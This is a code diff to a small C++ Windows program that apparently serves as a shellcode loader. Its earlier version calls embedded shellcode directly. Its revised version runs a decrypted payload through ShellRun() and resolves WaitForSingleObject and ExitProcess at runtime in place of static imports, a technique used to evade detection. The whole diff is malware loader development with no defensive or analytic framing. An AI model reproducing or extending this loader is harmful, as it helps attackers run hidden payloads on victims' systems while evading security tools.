@@ -1,9 +1,15 @@
 #include <Nax.h>
 #include <Shellcode.h>
+#include <Decrypt.h>
 
-auto Runner( VOID ) -> VOID {
-    VOID ( *Nax )( VOID ) = ( decltype( Nax ) )Shellcode::Data;
-    Nax();
+static VOID Runner( VOID ) {
+    if ( ShellRun() ) {
+        DWORD ( WINAPI *NaxWait )( HANDLE, DWORD ) =
+            ( DWORD ( WINAPI* )( HANDLE, DWORD ) ) NaxApi( "WaitForSingleObject" );
+        if ( NaxWait )
+            NaxWait( (HANDLE)-1, INFINITE );
+        for ( ;; ) ;   /* resolver failed - never return to a dead entry */
+    }
 }
 
 auto WINAPI WinMain(
@@ -13,11 +19,13 @@ auto WINAPI WinMain(
     _In_ INT32     ShowCmd
 ) -> INT32 {
     Runner();
-    WaitForSingleObject( (HANDLE)-1, INFINITE );
     return 0;
 }
 
 extern "C" VOID WinMainCRTStartup( VOID ) {
+    VOID ( WINAPI *NaxExit )( UINT ) = ( VOID ( WINAPI* )( UINT ) ) NaxApi( "ExitProcess" );
     INT32 ret = WinMain( NULL, NULL, NULL, 0 );
-    ExitProcess( (UINT)ret );
+    if ( NaxExit )
+        NaxExit( (UINT)ret );
+    for ( ;; ) ;   /* resolver failed - never return to a dead entry */
 }
